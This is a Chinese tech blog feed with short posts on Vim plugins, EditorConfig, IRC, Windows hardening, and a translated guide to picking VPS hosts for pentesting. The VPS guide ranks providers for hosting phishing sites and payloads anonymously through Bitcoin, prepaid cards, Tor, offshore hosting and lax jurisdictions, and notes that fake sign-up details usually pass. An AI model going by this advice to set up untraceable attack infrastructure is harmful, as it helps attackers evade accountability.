<p>安装完vim-plug插件管理器后，只需在<code>.vimrc</code>文件中做相关配置，然后进入Vim的命令行模式，输入<code>:PlugInstall</code>命令，即可自动下载并安装相应的插件，升级插件可使用<code>:PlugUpdate</code>命令，升级vim-plug本身，可使用<code>:PlugUpgrade</code>命令。个人常用的插件如下：</p>
<ul>
<li><a href="https://github.com/scrooloose/nerdtree">NERDTree</a>：显示文件树形目录</li>
<li><a href="https://github.com/Valloric/YouCompleteMe">YouCompleteMe</a>：代码自动补全</li>
<li><a href="https://github.com/mhinz/vim-startify">startify</a>：自定义起始页</li>
</ul>
<p>相应的，<code>.vimrc</code>文件中插件相关的配置项如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; vim-plug</span><br><span class="line">call plug#begin(&#39;~&#x2F;.vim&#x2F;plugged&#39;)</span><br><span class="line"></span><br><span class="line">function! BuildYCM(info)</span><br><span class="line">  &quot; info is a dictionary with 3 fields</span><br><span class="line">  &quot; - name:   name of the plugin</span><br><span class="line">  &quot; - status: &#39;installed&#39;, &#39;updated&#39;, or &#39;unchanged&#39;</span><br><span class="line">  &quot; - force:  set on PlugInstall! or PlugUpdate!</span><br><span class="line">  if a:info.status &#x3D;&#x3D; &#39;installed&#39; || a:info.force</span><br><span class="line">    !.&#x2F;install.py</span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line">Plug &#39;Valloric&#x2F;YouCompleteMe&#39;, &#123; &#39;do&#39;: function(&#39;BuildYCM&#39;) &#125;</span><br><span class="line">Plug &#39;scrooloose&#x2F;nerdtree&#39;, &#123; &#39;on&#39;:  &#39;NERDTreeToggle&#39; &#125;</span><br><span class="line">Plug &#39;mhinz&#x2F;vim-startify&#39;</span><br><span class="line"></span><br><span class="line">call plug#end()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>网站统计与分析</title>
    <url>/2018/09/22/web-analytics/</url>
    <content><![CDATA[<h2 id="几个术语"><a href="#几个术语" class="headerlink" title="几个术语"></a>几个术语</h2><ul>
<li>PV：Page View，即页面浏览量或点击量，用户每次刷新即被计算一次。</li>
<li>UV：Unique Visitor，指独立访客数，以cookie为依据，访问网站的一台电脑客户端为一个访客。一天内相同的客户端只会被计算一次。</li>
<li>IP：指独立IP数。一天内相同IP地址只被计算一次。</li>
</ul>
<h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><p>有许多第三方的工具可以帮助站长统计和分析网站流量，比如<a href="https://tongji.baidu.com/">百度统计</a>、<a href="http://ta.qq.com/">腾讯分析</a>、<a href="https://analytics.google.com/analytics/web">Google Analytics(GA)</a>等。个人经常使用Google Analytics。<br>这类工具的原理大致为：它们会生成一段特定的JS代码，站长需要将这段代码插入到自己网站的页面中，当访客访问网站时，这段代码会收集访客的行为信息，并上传到它们的服务器上。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>网站的WWW问题</title>
    <url>/2018/09/12/web-www/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>开发环境代表什么</title>
    <url>/2018/09/23/what-is-development-environment/</url>
    <content><![CDATA[<p>按照编程语言的执行原理，一般将其分为<strong>编译型语言</strong>（如 C）和<strong>解释型语言</strong>（如 Python），对于编译型语言来说，它的开发环境就代表该语言的<strong>编译器</strong>和其<strong>基本类库</strong>，对于解释型语言来说，它的开发环境就代表该语言的<strong>解释器</strong>和其<strong>基本类库</strong>。请注意，这里我并没有提到<strong>编辑器</strong>，因为编辑器并不属于每种语言所特有的范畴。</p>
<p>对于解释型语言来说，它的开发环境就等于运行环境，而对于编译型语言，可以说它不需要运行环境。请注意，Java 可以理解为是一种<strong>先编译后解释</strong>的语言，所以运行 Java 程序之前需要安装 JRE（Java 运行环境）。</p>
<p>如今许多语言的 IDE（集成开发环境），已经集编辑器、该语言的编译器/解释器、基本类库等于一体。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>editorconfig 是什么</title>
    <url>/2018/09/23/what-is-editorconfig/</url>
    <content><![CDATA[<p>开发同一项目的不同的人，可能会使用不同的编辑器，又会有不同的设置，这就会造成不同的代码格式，为了统一同一项目的代码格式，由此诞生了 <a href="https://editorconfig.org/">EditorConfig</a> ，它包含了<strong>一个用于定义代码格式的文件</strong>和<strong>一批编辑器插件</strong>，这些插件可以让编辑器读取配置文件并依此格式化代码。</p>
<p>一个典型的 EditorConfig 配置文件如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 这是一行注释，以#开头</span><br><span class="line"></span><br><span class="line"># 表示此文件为最顶级</span><br><span class="line">root &#x3D; true</span><br><span class="line"></span><br><span class="line"># 设定每个文件每行以换行（LF）结束，文件末尾添加一个新行</span><br><span class="line">[*]</span><br><span class="line">end_of_line &#x3D; lf</span><br><span class="line">insert_final_newline &#x3D; true</span><br><span class="line"></span><br><span class="line"># 匹配所有以 js 和 py 为后缀名的文件</span><br><span class="line"># 设定其编码为 UTF-8</span><br><span class="line">[*.&#123;js,py&#125;]</span><br><span class="line">charset &#x3D; utf-8</span><br><span class="line"></span><br><span class="line"># 匹配所有以 py 为后缀名的文件，设定其缩进为 4 个空格</span><br><span class="line">[*.py]</span><br><span class="line">indent_style &#x3D; space</span><br><span class="line">indent_size &#x3D; 4</span><br><span class="line"></span><br><span class="line"># 设定 Makefile 文件的缩进为 Tab</span><br><span class="line">[Makefile]</span><br><span class="line">indent_style &#x3D; tab</span><br><span class="line"></span><br><span class="line"># 匹配lib目录下所有以 js 为后缀名的文件，设定其缩进为 2 个空格</span><br><span class="line">[lib&#x2F;**.js]</span><br><span class="line">indent_style &#x3D; space</span><br><span class="line">indent_size &#x3D; 2</span><br><span class="line"></span><br><span class="line"># 设定 package.json 和 .travis.yml 的缩进为 2 个空格</span><br><span class="line">[&#123;package.json,.travis.yml&#125;]</span><br><span class="line">indent_style &#x3D; space</span><br><span class="line">indent_size &#x3D; 2</span><br></pre></td></tr></table></figure>

<p>此配置文件应该保存为 <code>.editorconfig</code> 并放置在项目目录中，编辑器的 EditorConfig 插件会从文件打开目录开始依次向其父级目录查找并读取配置文件，直到遇见 <code>root = true</code> 为止。</p>
<p>有很多项目在初始化时都会生成相应的 <code>.editorconfig</code> 文件，比如 Angular。</p>
<p>另外，Visual Studio 和 JetBrains 家的大部分 IDE 都已经原生支持了 EditorConfig，因此不用再安装插件；对于 Sublime Text 和 Vim 等未原生支持的编辑器，EditorConfig 官网提供了相应的插件下载地址。要了解详细的支持列表，请访问 EditorConfig 官网。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>IRC 是什么</title>
    <url>/2018/09/12/what-is-irc/</url>
    <content><![CDATA[<p><strong>IRC</strong>，全称 Internet Relay Chat，即<strong>因特网中继聊天</strong>，是早期经常使用的网络聊天方式，其主要用于群体聊天，但同样也可以用于个人对个人的聊天。</p>
<p>IRC 协议属于应用层协议，使用的传输层协议为 TCP，使用的端口为 <strong>6667</strong>（明文传输，如 irc://chat.freenode.net）或 <strong>6697</strong>（SSL 加密传输，如 ircs://chat.freenode.net:6697）。</p>
<p>IRC 是一个<strong>分布式</strong>的 <strong>C/S</strong> 架构，一个 IRC 服务器可以连接其他的 IRC 服务器以扩展为一个<strong>IRC 网络</strong>，通过连接到一个 IRC 服务器，我们可以访问这个服务器以及它所连接的其他服务器上的<strong>频道</strong>，频道存在于一个 IRC 服务器上，一个频道类似于一个聊天室，频道名称必须以 <code>#</code> 符号开始，例如 <code>#irchelp</code>。</p>
<p>大多数的 IRC 服务器不需要客户注册登录，虽然在连接前必须设定好昵称（nickname），但客户端一般都会自动分配一个。</p>
<p>目前使用最广的 IRC 服务器为 <a href="https://freenode.net/">freenode</a> ，而 IRC 客户端软件有多种，比如基于 Firefox 浏览器的 IRC 插件<a href="http://chatzilla.hacksrus.com/">ChatZilla</a> ，基于网页的 <a href="https://webchat.freenode.net/">Webchat</a> ，基于命令行的 <a href="https://irssi.org/">Irssi</a> 、<a href="https://weechat.org/">WeeChat</a> 等等。</p>
<p>个人经常使用的 IRC 客户端为 Irssi，在 Ubuntu 中可以使用 <code>apt install irssi</code> 安装，之后直接输入 <code>irssi</code> 即可启动，输入 <code>irssi --help</code> 可查看更多命令参数。<br>启动 irssi 后可输入更多的命令，输入 <code>/help</code> 可查看所有可用命令，输入 <code>/connect Freenode</code> 即可连接到freenode服务器，之后再输入 <code>/join #linuxba</code> 即可加入 <code>#linuxba</code> 频道。<br>这里需要注意，freenode 服务器由于种种原因，在国内无法访问，而 irssi 又不支持代理，所以推荐使用 <a href="https://github.com/rofl0r/proxychains-ng">proxychains-ng</a> 代理 irssi。</p>
<p>最后，值得推荐的 IRC 频道有下（基于 freenode）：</p>
<ul>
<li><code>#ubuntu-cn</code>：Ubuntu 中文社区频道</li>
<li><code>#archlinux-cn</code>：Arch Linux 中文社区频道</li>
<li><code>#linuxba</code>：Linux 贴吧频道</li>
<li><code>#haskell</code>：Haskell 语言频道</li>
<li><code>#vim</code>：Vim 社区频道</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>白帽子 VPS 选购指南</title>
    <url>/2019/02/25/whitehat-vps/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://null-byte.wonderhowto.com/how-to/white-hats-guide-choosing-virtual-private-server-0183135/">https://null-byte.wonderhowto.com/how-to/white-hats-guide-choosing-virtual-private-server-0183135/</a> ，正文如下：</p>
<p>从受信任的 VPS 进行网络钓鱼活动和托管 Metasploit 会话对于任何专业安全研究人员，渗透测试人员或白帽黑客都很重要。但是，可供选择的 VPS 非常有限，因为大多数提供商对任何类型的黑客都有零容忍政策，无论好坏。在研究了数十种产品之后，我们选出了 5 个理想的产品，非常适合 Null Byte 读者。</p>
<a id="more"></a>
<p>首先要理解的事情是......什么是 VPS？嗯，它代表虚拟专用服务器，是许多用户认为的专用或私有服务器的虚拟化形式，即使它安装在同时运行多个操作系统的物理计算机上。VPS 最常用于在线托管网站。</p>
<p>当我们从提供商处购买 VPS 时，我们实际上是在一个有着许多虚拟服务器的功能强大的高性能物理机器上“租用”一个分区。每个 VPS 都连接到互联网，使个人客户能够使用不同的操作系统，并提供对操作系统的完全 root 访问权限。每个客户（或服务器管理员）独立于共享 VPS 公司提供的物理计算机上的其他客户运营。</p>
<ul>
<li>不要错过：<a href="https://null-byte.wonderhowto.com/news/what-is-white-hat-hacker-0166878/">什么是白帽黑客？</a></li>
</ul>
<p>从本质上讲，虚拟专用服务器是我们可以从世界上任何连接互联网的设备远程控制的计算机。这给了我们很大的能力。对于远程服务器而言，下面是它可以完成的一些事情：</p>
<ul>
<li>创建 VPN 连接</li>
<li>托管网络钓鱼站点</li>
<li>进行暴力攻击</li>
<li>创建 IRC 机器人</li>
<li>服务器代理</li>
<li>托管有效载荷</li>
<li>使用端口扫描器</li>
<li>创建蜜罐</li>
<li>托管 Metasploit 会话</li>
</ul>
<p>为了做到这一点，从我们的研究来看，<a href="https://bulletshield.su/">BulletShield</a> 是迄今为止最好的白帽和渗透测试人员的 VPS 提供商，紧随其后的是 <a href="https://buyvm.net/">BuyVM</a> 和 <a href="https://www.clientvps.com/">ClientVPS</a>。亚军是 <a href="https://vpsdime.com/">VPSDime</a> 和 <a href="https://onehostcloud.hosting/">OneHost Cloud</a>。你可以在下面的图表中看到原因，但跳到下面可以深入研究每个比较点的含义。<br><img src="https://img.wonderhowto.com/img/36/31/63655508941243/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="图表"></p>
<h2 id="关键比较点"><a href="#关键比较点" class="headerlink" title="关键比较点"></a>关键比较点</h2><p>网上有几个 VPS 对比图表，但没有一个对我来说是与渗透测试人员和白帽子有所联系的。在大多数专业的渗透测试场景中，我们需要在几天内启动 VPS 来托管有效载荷，接收泄漏数据或执行网络钓鱼攻击。</p>
<p>无论 VPS 提供商是否提供实时技术支持，难以理解的硬件规格或过多的操作系统选择都很重要。理想情况下，我们希望使用比特币（BTC）从位于尊重隐私的国家的 VPS 提供商处快速购买最新的 Debian 版本。</p>
<p>在比较本文中介绍的 VPS 提供商时，我试图尽可能客观公正。本文中没有 VPS 提供商付费参与比较图表。我使用下面的标准来得出上面的图表。</p>
<ul>
<li>不要错过：<a href="https://smartphones.gadgethacks.com/how-to/binance-101-sell-your-stellar-ripple-other-alt-coins-for-bitcoin-ethereum-0182373/">如何在比特币和以太坊中出售你的 Stellar，Ripple 和其他替代币？</a></li>
</ul>
<h3 id="最好的价钱（Best-Price）"><a href="#最好的价钱（Best-Price）" class="headerlink" title="最好的价钱（Best Price）"></a>最好的价钱（Best Price）</h3><p>我相信定价透明度。这意味着提供商完全诚实地说他们的月费是多少。我的图表中列出的价格可能并不总是反映出给定提供商在主页上公布的价格。我的图表中的价格是计算所有强制性和隐藏费用后的结账价格。这些也是我在网站上找到的最便宜的 VPS 计划的价格。在大多数情况下，这通常有着 512 MB 的 RAM 和 1 个 CPU 内核。</p>
<h3 id="渗透测试人员友好型（Pentester-Friendly）"><a href="#渗透测试人员友好型（Pentester-Friendly）" class="headerlink" title="渗透测试人员友好型（Pentester-Friendly）"></a>渗透测试人员友好型（Pentester-Friendly）</h3><p>服务条款（ToS）和可接受的使用政策（AUP）可能是进入此比较图表的最高优先项。虽然最初考虑了数十个 VPS 提供商，但大多数明确禁止或阻止端口扫描器，有效载荷分发，网络钓鱼和（或）任何类型的黑客攻击。除了少数例外，这会立即取消 VPS 提供商在比较图表中的资格。</p>
<p>IT 专业人员，安全研究人员和自学成才的白帽黑客在远程服务器上做了大量工作。对我来说很重要的是，这里的 VPS 提供商保留了最符合 Null Byte 受众需求的 ToS 政策。我的图表中的 VPS 提供商是少数几个没有完全敌视“黑客攻击”的 ToS 政策的提供商。</p>
<p>那些被认为是对渗透测试人员友好的提供商并没有在他们的 ToS 中明确声明允许“黑客攻击”（或任何相关术语）。没有一个 VPS 提供商会这样做。大多数这些提供商要么没有提及他们的 ToS 中的黑客攻击，要么他们的网站上根本没有提供 ToS。这被认为表明黑客攻击活动非常不受欢迎，但可能不会导致帐户终止。</p>
<h3 id="请求个人信息（Requests-Personal-Info）"><a href="#请求个人信息（Requests-Personal-Info）" class="headerlink" title="请求个人信息（Requests Personal Info）"></a>请求个人信息（Requests Personal Info）</h3><p>向任何网站提交我们的真实姓名，地址，电话号码和其他个人身份信息都是不可取的。即使匿名不是你的首要任务，VPS 提供商仍有一天可能会受到攻击，并且所有客户数据都会在网上泄露。</p>
<p>购买 VPS 订阅是理想的匿名完成，因为没有人知道我们在研究或渗透测试期间会遇到什么麻烦。对于你购买的服务器上发生的事情，有朝一日可能会对 VPS 提供商采取法律行动，因此最好将有关你自己的少量信息存储在提供商的客户数据库中。</p>
<p>在大多数情况下，我发现在注册期间可以提交一个完全虚假的姓名，地址和电话号码，但我并不认为这是提供商的“好功能”。向任何合法公司提交虚假信息几乎肯定会违反提供商的服务条款并导致帐户立即终止。</p>
<p>VPS 提供商要求的电子邮件地址不属于“个人信息”，因为匿名获取一次性电子邮件地址很容易。毕竟 VPS 提供商需要建立与客户沟通的有效方法。</p>
<h3 id="接受比特币付款（Accepts-BTC-Payments）"><a href="#接受比特币付款（Accepts-BTC-Payments）" class="headerlink" title="接受比特币付款（Accepts BTC Payments）"></a>接受比特币付款（Accepts BTC Payments）</h3><p>如果获得比特币（BTC）不是障碍，这可能是你的首选付款方式。目前大多数提供商都接受比特币，但使用匿名加密货币的好处大部分都被 VPS 提供商对个人身份信息的请求所抵消。我发现使用比特币进行在线购物比使用信用卡更快更方便。</p>
<h3 id="接受预付信用卡（Accepts-Prepaid-Credit-Cards）"><a href="#接受预付信用卡（Accepts-Prepaid-Credit-Cards）" class="headerlink" title="接受预付信用卡（Accepts Prepaid Credit Cards）"></a>接受预付信用卡（Accepts Prepaid Credit Cards）</h3><p>获取比特币进行匿名交易可能很困难。用现金购买<a href="https://null-byte.wonderhowto.com/how-to/securely-anonymously-spend-money-online-0131351/">预付卡或一次性借记卡</a>可能更方便。如果没有使用预付借记卡实际提交付款，很难验证这一点。在大多数情况下，我能够联系客户服务代表，并从他们那里获得有关使用预付卡进行交易的直接答复。</p>
<h3 id="Tor-友好型网站（Tor-Friendly-Website）"><a href="#Tor-友好型网站（Tor-Friendly-Website）" class="headerlink" title="Tor 友好型网站（Tor-Friendly Website）"></a>Tor 友好型网站（Tor-Friendly Website）</h3><p>如果你通过安全的 VPN 连接使用信用卡进行在线购买或通过 Tor 匿名进行在线购买，VPS 提供商有时会暂停你的帐户。联系客户支持并解决暂停可能需要数天时间。</p>
<p>我使用同一个常用的 Firefox 浏览器通过 Tor 浏览了每个站点。要求访问者填写验证码以查看其网站或处理结帐的提供商被标记为对希望保持匿名的用户不友好。这并不意味着可以通过 Tor 进行事务处理。在查看这些网站时，我只尽可能地进入结账过程，而不实际提交付款。</p>
<ul>
<li>不要错过：<a href="https://null-byte.wonderhowto.com/how-to/access-dark-web-while-staying-anonymous-with-tor-0179341/">如何使用 Tor 匿名的访问暗网？</a></li>
</ul>
<h3 id="公司总部所在国（Company-HQ-39-s-Country）"><a href="#公司总部所在国（Company-HQ-39-s-Country）" class="headerlink" title="公司总部所在国（Company HQ&#39;s Country）"></a>公司总部所在国（Company HQ&#39;s Country）</h3><p>认为提供安全加密交易的公司将与当局充分<a href="https://www.theregister.co.uk/2011/09/26/hidemyass_lulzsec_controversy/">合作以捕获黑客</a>并不是不切实际的。VPS 的 IP 地址是否来自尊重隐私的国家并不总是重要的。如果向你提供 VPS 的公司位于美国或英国，他们很可能会毫不犹豫地将你的个人信息交给任何权威人士。</p>
<p>进一步涉及隐私问题，<a href="https://zh.wikipedia.org/wiki/%E8%8B%B1%E7%BE%8E%E5%8D%94%E5%AE%9A">UKUSA 协议</a>是英国，美国，澳大利亚，加拿大和新西兰之间的协议，旨在合作收集，分析和共享情报。这个群体的成员被称为<a href="https://zh.wikipedia.org/wiki/%E4%BA%94%E7%9C%BC%E8%81%AF%E7%9B%9F">五眼联盟</a>。这些国家因拥有侵犯隐私的法律和政策而臭名昭著。</p>
<p>在最尊重隐私的国家选择 VPS 提供商可能不是最优先考虑的问题，但至少考虑具有<a href="https://nomadcapitalist.com/2013/12/15/top-5-best-countries-host-website-data-privacy/">良好隐私法律的国家</a>的提供商是有意义的。</p>
<h3 id="离岸解决方案（Offshore-Solutions）"><a href="#离岸解决方案（Offshore-Solutions）" class="headerlink" title="离岸解决方案（Offshore Solutions）"></a>离岸解决方案（Offshore Solutions）</h3><p>“离岸 VPS”意味着服务器位于公司的国家边界位置之外，并且可能允许一定程度的自由裁量权。这对你作为渗透测试人员以及你受委托保护的公司非常重要，因为你可能会收到不应共享或泄露的妥协和敏感信息。我们鼓励读者独立询问 VPS 提供商，以确定他们的离岸解决方案是否适合你。</p>
<p>提供商指出，提供离岸解决方案通常要付出一定的代价。不应该假设他们最便宜的 VPS 解决方案也是其离岸选项的价格。</p>
<h2 id="1、BulletShield"><a href="#1、BulletShield" class="headerlink" title="1、BulletShield"></a>1、BulletShield</h2><p><a href="https://bulletshield.su/">BulletShield</a> 是我的首选，是 Null Byte 读者的最佳 VPS 提供商。BulletShield 在注册账户或准备提交比特币交易时不要求任何类型的个人信息。他们还强制要求比特币交易，并且没有明确禁止任何渗透测试活动的 ToS。<br><img src="https://img.wonderhowto.com/img/36/93/63655505111133/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="BulletShield"><br>缺点是他们不接受预付信用卡，最便宜的价格有点贵，但如果你重视隐私，价格不一定是主要考虑因素。</p>
<p>在涉及公司总部时，BulletShield 不会透露这些信息。快速域名搜索显示，它是由加拿大公司 Tucows Domains Inc. 购买的，是从位于西印度群岛偏远岛屿的 Charlestown 购买的。但是，这并不意味着这就是 BulletShield 的总部所在地，这只是域名注册商 BulletShield 使用注册域名的地方。</p>
<p>他们提供离岸解决方案和 Tor 友好型网站，使 BulletShield 整体处于领先地位。但是，一位客户服务代表向我提到“渗透测试”是“仅允许......防弹服务”，这可能是成本方面的问题。</p>
<ul>
<li>ToS：无可用</li>
<li>AUP：无可用</li>
<li>隐私：无可用</li>
</ul>
<h2 id="2、BuyVM"><a href="#2、BuyVM" class="headerlink" title="2、BuyVM"></a>2、BuyVM</h2><p><a href="https://buyvm.net/">BuyVM</a> 是允许合法渗透测试的亚军，如果公司或相关人员给出明确和合法的书面同意。一位代表证实了这一点，他们说“他们需要一份来自法律团队的完整文件，代表有关目标的授权书”。<br><img src="https://img.wonderhowto.com/img/33/95/63655505142883/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="BuyVM"><br>他们的起价确实提升了他们的排名，VPS 解决方案每月只需 2.42 美元。但是，他们确实要求你提供个人信息，并且为了注册帐户，“帐户详细信息必须与付款方式提供的信息相符”，这可能意味着匿名预付卡将无法使用。不过，比特币是可以被接受的。</p>
<p>虽然他们确实有一个 Tor 友好的网站，但他们总部设在加拿大，并不提供离岸解决方案，这可能是负面的，取决于你使用 VPS 的目的。</p>
<ul>
<li>ToS：<a href="https://buyvm.net/terms-of-service/">链接</a></li>
<li>AUP：<a href="https://buyvm.net/acceptable-use-policy/">链接</a></li>
<li>隐私：<a href="https://buyvm.net/privacy-policy/">链接</a></li>
</ul>
<h2 id="3、ClientVPS"><a href="#3、ClientVPS" class="headerlink" title="3、ClientVPS"></a>3、ClientVPS</h2><p><a href="https://www.clientvps.com/zh-cn">ClientVPS</a> 有一个 ToS，即你所执行的任何导致对人身或财产“受到伤害”，侵犯版权等的行为都要你自己承担全部责任。<br><img src="https://img.wonderhowto.com/img/69/58/63655505152117/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="ClientVPS"><br>总的来说，他们的价格是最昂贵的，但亮点包括接受比特币（预付 Visa 卡尚不清楚），拥有 Tor 友好的网站，总部设在俄罗斯（信息请求经常被忽略），并提供离岸解决方案，所有这些都巩固了其目前在排名中的地位。</p>
<p>除了高昂的价格外，其他缺点包括他们缺乏有关合法渗透测试的信息（他们没有回复我的询问），他们确实要求你提供个人数据。</p>
<ul>
<li>ToS：<a href="https://www.clientvps.com/terms-of-service">链接</a></li>
<li>AUP：无公开链接</li>
<li>隐私：<a href="https://www.clientvps.com/privacy-policy">链接</a></li>
</ul>
<h2 id="4、VPSDime"><a href="#4、VPSDime" class="headerlink" title="4、VPSDime"></a>4、VPSDime</h2><p><a href="https://vpsdime.com/">VPSDime</a> 不是一个非常理想的选择，因为它们没有比特币支付选项，不允许客户匿名查看他们的网站，也没有任何离岸 VPS 解决方案。但是，他们的 ToS 只是明确禁止“端口扫描”。他们没有提及渗透测试，漏洞扫描，网络钓鱼或其他常见的渗透活动。<br><img src="https://img.wonderhowto.com/img/00/36/63655505163524/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="VPSDime"><br>当询问澄清他们的合法渗透测试政策时，他们没有回复我的电子邮件。他们的 ToS 太模糊了，我无法确定是否允许这样的（合法）活动。出于这个原因，我建议读者在使用他们的服务之前联系 VPSDime 澄清。</p>
<p>虽然 VPSDime 没有明显的好处，但它们是最便宜的选择之一。</p>
<ul>
<li>ToS：<a href="https://vpsdime.com/tos.html">链接</a></li>
<li>AUP：<a href="https://vpsdime.com/aup.html">链接</a></li>
<li>隐私：<a href="https://vpsdime.com/privacy.html">链接</a></li>
</ul>
<h2 id="5、OneHost-Cloud"><a href="#5、OneHost-Cloud" class="headerlink" title="5、OneHost Cloud"></a>5、OneHost Cloud</h2><p><a href="https://onehostcloud.hosting/">OneHost Cloud</a> 是我能找到的唯一提供 Kali Linux VPS 和渗透测试解决方案的 VPS 提供商。他们的价格仅为每月 6.59 美元，这是该提供商的另一个主要好处，并且他们接受比特币付款。<br><img src="https://img.wonderhowto.com/img/55/35/63655505173336/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="OneHost Cloud"><br>对于那些不打算在未经同意的情况下非法扫描网站或入侵实体的白帽子来说，OneHost Cloud<br>似乎是最佳选择。毕竟如果它们提供 Kali 解决方案但不允许合法的渗透测试，那么对于客户来说也会非常混乱。但是，当我询问合法渗透测试时，他们只是回答：</p>
<blockquote>
<p>来自此地址的所有未来电子邮件都将被阻止。</p>
</blockquote>
<p>这是在没有任何理由或解释的情况下发给我的。出于这个原因，OneHost Cloud 排在最后，我建议读者在执行任何类型的渗透测试之前，独立地向 OneHost Cloud 询问他们的 ToS 策略。</p>
<p>该提供商的其他缺点是要求提供个人信息；位于英国伦敦；没有匿名网站；并且缺乏有关离岸解决方案和预付卡的信息。</p>
<ul>
<li>ToS：<a href="https://onehostcloud.hosting/legal/">链接</a></li>
<li>AUP：无公开链接</li>
<li>隐私：<a href="https://onehostcloud.hosting/privacy-policy/">链接</a></li>
</ul>
<h2 id="意见"><a href="#意见" class="headerlink" title="意见"></a>意见</h2><p>专业和独立渗透测试人员的选择是非常有限的。大多数 VPS 提供商都有检测系统，如果检测到任何类型的扫描，网络钓鱼或垃圾邮件，它们会自动暂停客户帐户。在我们的测试计划中，可能需要数天才能解决暂停并造成重大挫折。</p>
<p>选择愿意与我们合作以更好地保护公司网站的提供商是至关重要的。如果你是一个专业的渗透测试者，或者只是一个希望以安全和匿名的方式加强技能的新手黑客，那么选择最能满足你需求并获得乐趣的提供商。</p>
<ul>
<li>不要错过：<a href="https://null-byte.wonderhowto.com/how-to/hack-anyones-wi-fi-password-using-birthday-card-part-1-creating-payload-0183043/">如何使用生日卡片破解任何人的 Wi-Fi 密码？</a></li>
</ul>
<h2 id="一些评论"><a href="#一些评论" class="headerlink" title="一些评论"></a>一些评论</h2><p>Pulkit Singhania：</p>
<blockquote>
<p>Cloudsigma 实际上也是一个不错的选择。<br>  他们提供免费的 vps，没有任何登录或任何注册的免费，但只有一个小时。<br>  我亲自尝试过，它提供 2GB 内存和 50GB 硬盘，最高可达 25兆字节/秒的互联网流量。<br>  如果你使用公司电子邮件注册，则可免费试用 7 天</p>
</blockquote>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>编写Wikipedia的几点注意</title>
    <url>/2018/12/16/wikipedia/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Windows 系统加固</title>
    <url>/2018/05/19/windows-reinforcement/</url>
    <content><![CDATA[<h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p>下面这几项应为每一个使用 Windows 的用户的<strong>最最基本</strong>安全配置：</p>
<ol>
<li>开启 Windows 防火墙</li>
<li>设置用户帐户控制（UAC）为合适级别</li>
<li>保持 Windows 更新</li>
</ol>
<a id="more"></a>
<h2 id="帐户安全"><a href="#帐户安全" class="headerlink" title="帐户安全"></a>帐户安全</h2><p>此方面的加固主要是为了防止针对帐户的暴力破解，帐户是黑客入侵系统的突破口，帐户越多，危险系数越高。</p>
<p>停用 Guest 帐户：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中禁用 Guest 帐户，并为 Guest 帐户设置复杂密码，并拒绝远程访问。</p>
<p>重命名或禁用 Administrator 帐户：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中为 Administrator 帐户重命名，或直接禁用。</p>
<p>创建陷阱帐户：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中创建一个名为 Administrator 的本地帐户，并将它的权限设置成最低，加上一个超过 10 位的强密码。可通过将其隶属于 Guest 组已达到权限最低。</p>
<p>限制用户数量：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中删除所有的测试帐户、共享帐户和普通部门帐户，一般情况下，如果系统用户超过 10 个，一般总会存在一两个弱口令帐户。</p>
<p>开启帐户锁定策略：<br>在<strong>本地安全策略</strong>的<strong>帐户锁定策略</strong>中设置帐户锁定阈值为 3 次，帐户锁定时间为 30 分钟，重置帐户锁定计数器为 30 分钟之后。</p>
<h2 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h2><p>一个安全操作系统的基本原则是：<strong>最小的权限+最少的服务=最大的安全</strong>。</p>
<p>开启密码策略：<br>在<strong>本地安全策略</strong>的<strong>密码策略</strong>中启用密码复杂性要求，设置密码长度最小值为 7，密码最短使用期限为 1，密码最长使用期限为 42，强制密码历史为 24，禁用以可还原的加密储存密码。</p>
<p>设置双重加密帐户保护：<br>在运行对话框中输入 <code>syskey</code>，启用 SAM 数据库加密工具，为 Windows 登录设置双重加密，注意此功能在 Windows10 中已被剔除。</p>
<p>取消默认共享：<br>编辑注册表键 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters</code>，新建项 <code>AutoShareServer</code>，值为 <code>0</code>，即可关闭盘符默认共享，新建项 <code>AutoShareWks</code>，值为 <code>0</code>，即可关闭 ADMIN 默认共享。</p>
<p>开启审核策略：<br>在<strong>本地安全策略</strong>的<strong>审核策略</strong>中审核所有的成功失败操作，记录的信息可以在<strong>事件查看器</strong>的 <strong>Windows 日志</strong>中查看。</p>
<p>修改 TTL 值：<br>编辑注册表键 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters</code>，新建项 <code>defaultTTL</code>，随便赋值，以防黑客通过 ping 获取 TTL 以鉴别操作系统类型。</p>
